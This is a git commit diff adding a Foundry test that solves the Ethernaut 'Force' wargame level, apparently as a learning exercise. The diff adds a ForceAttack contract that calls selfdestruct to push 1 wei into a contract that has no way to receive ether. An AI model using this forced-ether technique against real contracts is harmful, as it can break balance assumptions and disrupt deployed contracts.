0cf3bcfd8ac1af0667d422d3b2f01041c13bb312
islu <38793955+islu@users.noreply.github.com>
2024-04-15 17:43:21 +0800

    solve challenge (force)

--- test/Force.t.sol
+++ test/Force.t.sol
@@ -5,19 +5,41 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {ForceFactory} from "../src/factories/ForceFactory.sol";
 import {Force} from "../src/levels/Force.sol";
 
+import "forge-std/console.sol";
+
 contract ForceTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         ForceFactory factory = new ForceFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveForce() public {
-        Force instance = Force(payable(levelAddress));
+        // Force instance = Force(payable(levelAddress));
 
-	// insert your code here!
-	
+        // [START]
+
+        ForceAttack attacker = new ForceAttack(payable(levelAddress));
+        attacker.attack{value: 1 wei}();
+
+        console.log("balance: ", levelAddress.balance);
+
+        // [END]
+
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
+    }
+}
+
+// Attacker contract
+contract ForceAttack {
+    Force public target;
+
+    constructor(address _target) {
+        target = Force(payable(_target));
+    }
+
+    function attack() public payable {
+        selfdestruct(payable(address(target)));
     }
 }
